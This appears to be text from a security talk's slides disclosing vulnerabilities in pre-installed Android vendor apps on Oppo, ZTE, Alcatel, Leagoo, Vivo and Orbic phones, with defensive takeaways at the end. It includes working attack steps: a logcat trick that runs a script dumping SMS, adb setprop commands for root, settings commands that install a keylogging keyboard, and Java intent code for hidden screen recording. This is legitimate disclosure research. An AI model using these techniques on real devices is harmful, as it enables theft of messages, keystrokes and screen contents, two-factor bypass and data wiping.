### Exploitation Technique: Command Execution via Logcat

**Command:**
```sh
sh /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh
```

**Approach 2: Transfer Command Output Using a File in App’s Directory**

1. **Select a Log Tag with High Entropy:**
   - Example: `UQ2h9hVRhLfg`

2. **Make the Attacking App’s Private Directory World-Executable and Create a Globally Writable and Readable File (msg.txt):**
   - Ensure the directory is world-executable.
   - Create a globally writable and readable file named `msg.txt`.

3. **Write Lines of the Script with the Selected Log Tag to the Log from the Attacking App:**
   ```java
   Log.d("UQ2h9hVRhLfg", "#!/bin/sh");
   Log.d("UQ2h9hVRhLfg", "content query --uri content://sms > /data/data/com.attacking.app/msg.txt");
   ```

4. **Make the Vulnerable App Execute Commands to Write the Lines to a Shell Script and Execute It:**
   ```sh
   logcat -v raw -b main -s UQ2h9hVRhLfg:* *:S -f /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh -d
   chmod 770 /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh
   sh /data/data/com.dropboxchmod/UQ2h9hVRhLfg.sh
   ```

### Sample of Oppo Android Devices – Command Execution as System User

| Device | Country | Status | Build Description |
|--------|---------|--------|-------------------|
| A77    | China   | Vulnerable | msm8953_64-user 7.1.1 NMF26F eng.root.20180609.153403 dev-keys |
| A59S   | China   | Vulnerable | full_oppo6750_15131-user 5.1 LMY47I 1525865236 dev-keys |
| A57    | Philippines | Vulnerable | msm8937_64-user 6.0.1 MMB29M eng.root.20180508.104025 release-keys |
| R11    | China   | Vulnerable | sdm660_64-user 7.1.1 NMF26X eng.root.20180426.130343 release-keys |
| F3 Plus | Pakistan | Vulnerable | msm8952_64-user 6.0.1 MMB29M eng.root.20180413.004413 release-keys |
| A39    | Australia | Vulnerable | full_oppo6750_16321-user 5.1 LMY47I 1520521221 release-keys |
| R9     | China   | Vulnerable | full_oppo6755_15111-user 5.1 LMY47I 1519426429 dev-keys |
| A77    | Australia | Vulnerable | full_oppo6750_16391-user 6.0 MRA58K 1517824690 release-keys |
| F3     | Vietnam | Vulnerable | full_oppo6750_16391-user 6.0 MRA58K 1517824690 release-keys |
| F3     | Pakistan | Vulnerable | full_oppo6750_16391-user 6.0 MRA58K 1517824690 release-keys |
| R9     | Australia | Vulnerable | full_oppo6755_15311-user 5.1 LMY47I 1516344361 release-keys |
| F5     | Malaysia | Vulnerable | full_oppo6763_17031-user 7.1.1 N6F26Q 1516160348 release-keys |
| F1S    | Australia | Vulnerable | full_oppo6750_15331-user 5.1 LMY47I 1509712532 release-keys |
| A37    | India   | Vulnerable | msm8916_64-user 5.1.1 LMY47V eng.root.20171008.172519 release-keys |
| R7 Plus | India   | Not Vulnerable | msm8916_64-user 5.1.1 LMY47V eng.root.20160922.193102 dev-keys |
| Neo 5  | Australia | Not Vulnerable | OPPO82_15066-user 4.4.2 KOT49H eng.root.1469846786 dev-key |
| R7S    | China   | Vulnerable | msm8916_64-user 5.1.1 LMY47V eng.root.20160713.211744 dev-keys |
| R7 Plus | China   | Not Vulnerable | full_oppo6795_15019-user 5.0 LRX21M 1465722913 dev-keys |

### Setting Your App as the Default Keyboard for Keylogging

1. **Implement an Input Method Editor (IME) in the Attacking App:**
   - Set the app as the default keyboard:
     ```sh
     /system/bin/settings put secure enabled_input_methods com.my.app/.NotSomeKeyboardService
     /system/bin/settings put secure default_input_method com.my.app/.NotSomeKeyboardService
     ```
   - Send key presses to the attacking app via a broadcast intent to a dynamically-registered broadcast receiver.
   - Alternatively, set your app as the default spell checker:
     ```sh
     /system/bin/settings put secure selected_spell_checker com.my.app/.NotSomeSpellingService
     ```
   - Note: The spell checker does not get the same amount of data as a custom keyboard.

### Analysis Framework Workflow

### Exposed Screenshot Capability

Certain vendors have modified the Android OS (system_server) to export the screenshot capability to any app on the device. This includes:

- Alcatel A30
- Asus Zenfone 3 Max
- Leagoo P1
- Nokia 6 TA-1025
- Asus ZenFone V Live
- Sony Xperia L1

**Malicious Apps Can:**
- Open apps to obtain sensitive data and examine active notifications.
- Requires `READ_EXTERNAL_STORAGE` permission to access the screenshot and `EXPAND_STATUS_BAR` to view current notifications.
- Taking a screenshot is not transparent to the user; a screen animation is displayed and creates a notification.
- The functionality cannot be disabled, as it lies within `system_server`.
- The attacking app can cause a system crash to remove the notification and bypass screen lock using certain `WindowManager.LayoutParams` flags.

### Insecure Rich Communication Services (RCS) App

**Source:** [T-Mobile Revvl Plus](https://www.t-mobile.com/devices/t-mobile-revvl-plus)

- Exported interfaces allow zero-permission apps to send arbitrary text messages, read and modify text messages, and obtain phone numbers of the user’s contacts.
- The app has two different package names:
  - `com.rcs.gsma.na.sdk`
  - `com.suntek.mway.rcs.app.service`
- Affects 3 T-Mobile devices: Coolpad Defiant, T-Mobile Revvl Plus, and ZTE ZMAX Pro.
- The app cannot be disabled.

### ZTE ZMAX Champ Vulnerabilities

- **Programmatic Factory Reset:**
  - The `com.zte.zdm.sdm` app writes `--wipe_data` to `/cache/recovery/command` and boots into recovery mode, wiping `/data` and `/cache`.
- **Obtain Logcat and Modem Logs:**
  - Done in the same way described previously for ZTE.
- **Brick Device:**
  - The device will boot into recovery mode, try to factory reset, crash, and repeat indefinitely.

**Source:** [ZTE ZMAX Champ](https://www.zteusa.com/zmax-champ)

### Unlocked Alcatel A30 – Local Root Privilege Escalation

- **Alcatel A30 was an Amazon Prime Exclusive device:**
  - Had a discounted price due to the inclusion of Amazon offers and ads.
- **Certain read-only properties can be modified at runtime, allowing a socket that accepts and executes arbitrary commands as the root user:**
  - Can be performed via ADB or pre-installed platform apps that execute as the system user.
  - Commands:
    ```sh
    adb shell setprop ro.debuggable 1
    adb shell setprop ro.secure 0
    adb root
    adb shell setenforce 0
    adb shell
    ```

**Source:** [Amazon Alcatel A30](https://www.amazon.com/gp/product/B01NC2RECJ)

- **Socket that Executes Commands as Root:**
  - Once the `ro.debuggable` property is set to 1, a world-writable socket named `factory_test` gets created.
  - Receives and executes commands as root.
  - The system user, including platform apps, can change the `ro.debuggable` property so that the `factory_test` socket gets created.

### Mickey6US: Socket Details

- **Directory Listing:**
  ```sh
  MICKEY6US:/dev/socket # ls –al
  total 0
  drwxr-xr-x  7 root      root       760 2017-05-10 17:58 .
  drwxr-xr-x 15 root      root      4220 2017-05-10 17:55 ..
  srw-rw---- 1 system    system       0 2017-05-10 17:58 adbd
  srw-rw---- 1 root      inet        0 1970-11-08 00:12 cnd
  srw-rw---- 1 root      mount       0 1970-11-08 00:12 cryptd
  srw-rw---- 1 root      inet        0 1970-11-08 00:12 dnsproxyd
  srw-rw---- 1 root      system      0 1970-11-08 00:12 dpmd
  srw-rw---- 1 system    inet        0 2017-05-10 17:55 dpmwrapper
  srw-rw-rw- 1 root      root        0 2017-05-10 17:58 factory_test
  ```

- **Factory Test Service:**
  - On property: `ro.debuggable=1`
  - Start `bt_wlan_daemon`
  - Service: `/system/bin/factory_test`
  - User: `root`
  - Group: `root`
  - One-shot
  - SELinux label: `u:r:bt_wlan_daemon:s0`

### Takeaways - Towards More Secure Apps

- **Do Not Export App Components Unnecessarily:**
  - Enforce proper access control.
- **Do Not Assume Apps Without an Accompanying AIDL File Cannot Interact with a Bound Service:**
  - They can.
- **Filter Commands When Allowing Command Execution as System User:**
  - Make it easier to report vulnerabilities by having a common email address such as `security@yourdomain.com`.
- **Thanks for attending and read our full report for more details!** (email at PI:EMAIL)

### Leagoo P1 & Leagoo Z5C (Unlocked)

- **Leagoo P1 - Android 7.0:**
  - Take a screenshot and write to SD card.
  - Programmatic factory reset.
  - Local root privilege escalation via ADB.
- **Leagoo Z5C - Android 6.0:**
  - Send arbitrary text messages (modified `com.android.messaging` app).
  - Read the most recent text message from each conversation (modified `com.android.messaging` app).
  - Programmatic factory reset (modified `com.android.settings` app).

**Commands:**
```sh
adb shell setprop ro.debuggable 1
adb shell setprop ro.secure 0
adb root
adb shell setenforce 0
adb shell
```

**Source:** [Leagoo Z5C](https://www.amazon.co.uk/LEAGOO-Z5C-Android-smartphone-1-3GHz/dp/B06X3QLCGY)

### Exposing Capability to Set System Properties

- **App Named `com.qualcomm.qti.modemtestmode`:**
  - Allows any app to set certain properties as the `com.android.phone` user.
  - Presumably a development/debugging app that should not be included in production builds.
- **Bound Service That Takes Key/Value Pair for System Properties:**
  - `android.os.SystemProperties.set(String, String)`
- **Setting Properties is Constrained by SELinux Rules:**
  - Works for `persist.*` properties which survive reboots.

### Vivo V7 (Non-US Carriers) Vulnerabilities

- **Dumps Logcat, Bluetooth, and Kernel Logs to External Storage:**
  - Leaves a notification while logging, but the logging app cannot be disabled.
- **Set Properties as the `com.android.phone` User:**
  - Can enable screen touch coordinates to be written to the logcat log.
- **Record the Screen for 60 Minutes to the Attacking App’s Directory:**
  - A notification and icon appear but can be removed quickly.
  - Can initiate screen-recording while the screen is off to remove any disturbance on the screen.

**Source:** [Vivo V7](https://www.vivo.com/my/products/v7)

- **Screen Recording:**
  - The 60-minute interval is set by the `com.vivo.smartshot` app.
  - Screen recording is performed by the `/system/bin/smartshot` binary.
  - Intent to start and stop screen recording:
    ```java
    Intent i = new Intent();
    i.setAction("vivo.action.ACTION_START_RECORD_SERVICE");
    i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
    i.putExtra("vivo.flag.vedio_file_path", "/data/data/com.attacking.app/screen.mp4");
    i.putExtra("show_top_stop_view", false);
    startService(i);
    try {Thread.sleep(500);} catch (InterruptedException e) {e.printStackTrace();}
    i = new Intent();
    i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
    stopService(i);
    try {Thread.sleep(500);} catch (InterruptedException e) {e.printStackTrace();}
    i = new Intent("vivo.acton.ACTION_CHANGE_TOP_STOP_VIEW");
    i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
    i.putExtra("show_top_stop_view", false);
    startService(i);
    ```

### Orbic Wonder (Unlocked) Vulnerabilities

- **Exposes Sensitive Functionality to Any App on the Device:**
  - Wipe all user data (factory reset).
  - Continuously monitor the logcat log to obtain:
    - GPS coordinates
    - Email addresses
    - Unique device identifiers
    - Body of incoming/outgoing text messages
    - Phone numbers for incoming/outgoing calls and text messages
- **Vulnerabilities Can Be Used to Bypass Two-Factor Authentication and Obtain Password Reset Texts.**

**Source:** [Orbic Wonder](https://www.bestbuy.com/site/orbic-wonder-4g-lte-with-16gb-memory-cell-phone-unlocked-black/6070202.p?skuId=6070202)